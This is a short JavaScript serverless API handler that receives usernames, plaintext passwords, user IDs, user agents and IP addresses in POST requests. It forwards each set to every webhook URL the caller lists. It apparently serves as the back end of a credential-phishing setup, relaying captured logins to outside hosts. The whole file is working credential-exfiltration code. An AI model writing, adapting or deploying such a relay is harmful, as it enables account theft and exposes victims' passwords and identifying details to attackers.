// api/webhook.js
export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { webhooks, username, password, uid, userAgent, ip } = req.body;

    // Validate required fields
    if (!webhooks || !Array.isArray(webhooks) || webhooks.length === 0) {
      return res.status(400).json({ error: 'No webhooks provided' });
    }

    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    // Prepare payload
    const payload = {
      uid: uid || 'unknown',
      username: username,
      password: password,
      timestamp: new Date().toISOString(),
      userAgent: userAgent || 'unknown',
      ip: ip || 'unknown'
    };

    // Send to all webhooks
    const results = await Promise.allSettled(
      webhooks.map(async (webhook) => {
        const response = await fetch(webhook, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload)
        });

        return {
          webhook: webhook,
          status: response.status,
          ok: response.ok
        };
      })
    );

    // Count successes and failures
    const succeeded = results.filter(r => r.status === 'fulfilled' && r.value?.ok).length;
    const failed = results.filter(r => r.status === 'rejected' || !r.value?.ok).length;

    return res.status(200).json({
      success: true,
      message: `Sent to ${succeeded} webhook(s)`,
      total: webhooks.length,
      succeeded: succeeded,
      failed: failed,
      results: results.map(r => r.status === 'fulfilled' ? r.value : { error: r.reason })
    });

  } catch (error) {
    console.error('Webhook error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
